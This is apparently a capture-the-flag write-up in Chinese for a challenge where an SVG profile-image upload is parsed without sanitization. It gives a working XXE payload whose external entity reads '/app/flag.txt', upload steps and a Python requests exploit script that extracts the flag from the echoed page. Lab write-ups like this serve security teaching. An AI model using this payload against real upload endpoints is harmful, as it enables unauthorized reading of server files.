# X-017-24 Cross 70
## 题目描述

> Uploading a profile image on SVG format without sanitization allows an attacker to perform an XXE attack

## 知识点

XXE（XML External Entity，XML 外部实体注入）。

## 解题思路

- 关键路径：文件上传点（SVG）→ 服务端 XML 解析 → 外部实体展开 → 回显中包含实体内容。
- 核心参数：构造带 DTD 的 SVG，定义外部实体指向本地文件（如 `file:///app/flag.txt`），在文档中引用实体（如 `&xxe;`）。
- 方法与工具：
  - 手动构造 `multipart/form-data` 请求上传 SVG；
  - 也可用 Python `requests` 快速发包；
  - 如果不确定旗子路径，可尝试访问可见的提示页（例如 `/hint`）或进行目录/接口枚举，确认 `/app/flag.txt` 存在。

## 解题步骤

1. 访问首页 `GET /`，看到“Profile Image (SVG)”上传点，推测服务端会对 SVG（XML）进行解析并回显。
2. 构造 XXE PoC：
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE svg [
   <!ENTITY xxe SYSTEM "file:///app/flag.txt">
   ]>
   <svg xmlns="http://www.w3.org/2000/svg">
     <text y="20">&xxe;</text>
   </svg>
   ```
3. 将上述内容作为上传文件（字段名 `image`，文件名任意如 `poc.svg`，`Content-Type: image/svg+xml`），同时带上表单字段 `name/surname/address` 任意值提交到 `/`。
4. 成功后页面会在“Current Image”区域回显解析后的 SVG，文本节点中即为文件内容，即可提取 flag。
![image.png](https://x/x12123312340.png)

## EXP
```python
import re
import requests

url = "http://ip32839/"

payload = """<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg"><text y="20">&xxe;</text></svg>
"""

data = {
    "name": "a",
    "surname": "b",
    "address": "c",
}

files = {
    "image": ("poc.svg", payload, "image/svg+xml")
}

r = requests.post(url, data=data, files=files, timeout=10)
m = re.search(r"FLAG\{.*?\}", r.text)
if m:
    print(m.group(0))
else:
    print("not found")
```